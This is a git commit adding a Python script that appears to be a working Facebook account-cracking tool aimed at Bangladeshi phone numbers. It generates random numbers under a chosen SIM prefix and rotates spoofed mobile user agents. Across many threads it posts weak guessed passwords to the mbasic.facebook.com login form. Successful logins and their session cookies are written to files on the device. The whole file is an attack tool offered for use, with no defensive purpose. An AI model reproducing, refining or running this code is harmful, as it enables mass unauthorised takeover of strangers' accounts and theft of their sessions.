00630534d8dc7afa678aef34f7d46d88f2929934
Robert Henry <154405876+ALIEN-XD-96@users.noreply.github.com>
2024-03-26 20:44:10 +0600

    Add files via upload

---
+++ DN.py
@@ -0,0 +1,304 @@
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os,sys,time,json,random,re,string,platform,base64,platform,uuid
+import requests,random,sys,json,os,re
+from time import sleep
+from os import system
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
+import marshal
+import zlib
+import base64
+from os import system as clr
+import random 
+import string
+from concurrent.futures import ThreadPoolExecutor as ted
+import uuid
+import httpx
+import json
+import sys
+from random import random as acak
+from random import choice as pilih
+from random import randint
+from bs4 import BeautifulSoup
+import requests as ress
+from sys import exit as exit
+try:
+    import requests
+except ImportError:
+    print('\n [✓] installing requests !...\n')
+    os.system('pip install requests')
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [✓] installing futures !...\n')
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n [✓] installing bs4 !...\n')
+    os.system('pip install bs4')
+    os.system('pkg install espeak')
+P = '\x1b[1;97m' # 
+M = '' # 
+H = '' # 
+K = '\x1b[1;97m' # 
+B = '' # 
+U = '' # 
+O = '\x1b[1;97m' # 
+N = '\x1b[0m'    # 
+id = []
+user = []
+oks = []
+cps = []
+loop = 0
+ugen=[]
+for xd in range(5000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
+    c='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
+    d=random.randrange(10,200)
+    e='0.4844.88 '
+    f=random.randrange(1000,8000)
+    g=random.randrange(10,200)
+    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
+    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
+    ugen.append(uaku2)
+for xd in range(9000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
+    c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    d=random.randrange(10,200)
+    e='0'
+    f=random.randrange(1000,8000)
+    g=random.randrange(10,200)
+    h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
+    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
+    ugen.append(uaku2)
+for ua in range(10000):
+      a='Mozilla/5.0 (Linux; Android'
+      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
+      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
+      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      d=random.randrange(40,115)
+      e='0'
+      f=random.randrange(3000,6000)
+      g=random.randrange(20,100)
+      h='Mobile Safari/537.36'
+      aJaber=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+      ugen.append(aJaber)
+for ua in range(10000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14','15'])
+	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	alhhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(alhhaj)
+
+for uex in range(5000):
+	aa='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c='V2042 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(80,104)
+	e='0'
+	f=random.randrange(4200,5300)
+	g=random.randrange(40,90)
+	h='Mobile Safari/537.36'
+	uaku2=f'{aa} {b}; {c}{d}.{e}.{f}.{g} {h}'
+	ugen.append(uaku2)
+
+
+
+for ux in range(6000):
+	aa='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c='M2004J19C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(80,120)
+	e='0'
+	f=random.randrange(4200,6000)
+	g=random.randrange(40,160)
+	h='Mobile Safari/537.36'
+	uak2=f'{aa} {b}; {c}{d}.{e}.{f}.{g} {h}'
+	ugen.append(uak2)
+
+
+
+for uiy in range(8000):
+	aa='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c='CPH2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(50,105)
+	e='0'
+	f=random.randrange(5000,5700)
+	g=random.randrange(70,140)
+	h='Mobile Safari/537.36'
+	uwo=f'{aa} {b}; {c}{d}.{e}.{f}.{g} {h}'
+	ugen.append(uwo)
+	
+for uux in range(6000):
+	aa='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c='M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(50,120)
+	e='0'
+	f=random.randrange(4600,5700)
+	g=random.randrange(30,90)
+	h='Mobile Safari/537.36'
+	uwex2=f'{aa} {b}; {c}{d}.{e}.{f}.{g} {h}'
+	ugen.append(uwex2)
+#Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36
+
+for utx in range(7000):
+	aa='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['7.0','8.1.0','9','10','11','12','13'])
+	c='PHW110 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(50,105)
+	e='0'
+	f=random.randrange(3500,5200)
+	g=random.randrange(70,150)
+	h='Mobile Safari/537.36'
+	uwb5=f'{aa} {b}; {c}{d}.{e}.{f}.{g} {h}'
+	ugen.append(uwb5)
+#Mozilla/5.0 (Linux; Android 13; PHW110 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36		
+#os.system("xdg-open https://t.me/JAVA_SCIPT_KING")
+logo =("""
+┓┏┓┳┳┓┏┓
+┃┫ ┃┃┃┃┓
+┛┗┛┻┛┗┗┛        
+""") 
+ 
+def Jaber():
+    os.system('clear')
+    #os.system('xdg-open https://facebook.com/groups/544684501030088/')
+    print(logo)
+    print("")
+   # print(" ")
+    print("   [1]  RANDOM BANGLADESH        ")
+    #print(" ")
+    #print(" ║  [2][B]  ᎫϴᏆΝ ᎷƳ ҒᏴ ᏀᎡϴႮᏢ       ║")
+    #print(" ║  [3][C]  ᎫϴᏆΝ ᎷƳ MS ᏀᎡϴႮᏢ       ║")
+    print("   [0]  ᎬХᏆͲ                   ")
+   # print(" ")
+    print("")
+    Jaber = input(f' SELECT: ')
+    if Jaber in ["1","A"]:
+        Jabers()
+   # if Jaber in ["2","B"]:
+        #os.system('xdg-open https://facebook.com/groups/544684501030088/')
+  #  if Jaber in ["3","C"]:
+        #os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official')
+    if Jaber in ["0","X"]:
+        os.system('exit')
+ 
+def Jabers():
+    user=[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    #print("╔════════════════════════════════════════════╗")
+    print(" SELECT ANY CODE : 016/017/018/019 ")
+    #print("╚════════════════════════════════════════════╝")
+    code = input(' PUT YOUR CODE : ')
+    os.system('clear')
+    #os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official')
+    print(logo)
+    #print("╔════════════════════════════════════════════╗")
+    print(" CRACKING LIMIT : [3000] [5000] [10000]  ")
+    #print("╚════════════════════════════════════════════╝")
+    limit=int(input(" LIMIT : "))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with ThreadPool(max_workers=40) as Fb_crack:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        #print("")
+        print(f' SIM CODE  : '+code) 
+        print(f' TOTAL UID : '+tl)
+        print("═════════════════════════════════════")
+        #print(f'║ MACK BY JABER x TANJID ')
+        #print("═════════════════════════════════════")
+        for love in user:
+            pwx = [love,love[2:],code+love[:3],'09876543','১২৩৪৫৬','৬৫৪৩২১','708090']
+            uid = code+love
+            Fb_crack.submit(Jaberm,uid,pwx,tl)
+    #print("╔═══════════════════════════╗")
+    #print(' [😚] HACKED COMPLETE ')
+    #print(' [😚] HI IM JABER ')
+    #print("╚═══════════════════════════╝")
+
+
+def Jaberm(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global agents
+    try:
+        for pas in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r [RANDOM-XRACK]X[%s]X[OK-%s]\r'%(loop,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":pas,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            'method': 'POST',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,bn-BD;q=0.6,bn;q=0.5',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '1.943750023841858',
+            'origin': 'https://mbasic.facebook.com',
+            'referer': 'https://mbasic.facebook.com/login/save-password-interstitial/?ref_component=mbasic_footer&ref_page=XSettingsFrameworkController&refid=31&paipv=0&eav=AfY5Lz0X6P2h59yIUEhZ6jrG7vZCoWMx8dpIQTA7s6BOCuMWF35a0C-tmbeOORlpIbw',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '""',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro,}
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                idf = re.findall('c_user=(.*);xs', coki)[0]
+                print('\r\r\x1b[38;5;46m[KING-OK] ' +uid+ ' | ' +pas+    '  \n[‎‎✓]\x1b[38;5;254mCOOKIES[🍪] \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
+                open('/sdcard/KIMG-RNDM-OK.txt', 'a').write( idf+'|'+pas+'|'+coki+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print(f'\r\r\x1b[38;5;123m[KIMG-CP] {uid} | {pas}')
+                open('/sdcard/FUCK-CP.txt', 'a').write( uid+' | '+pas+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+ 
+Jaber()
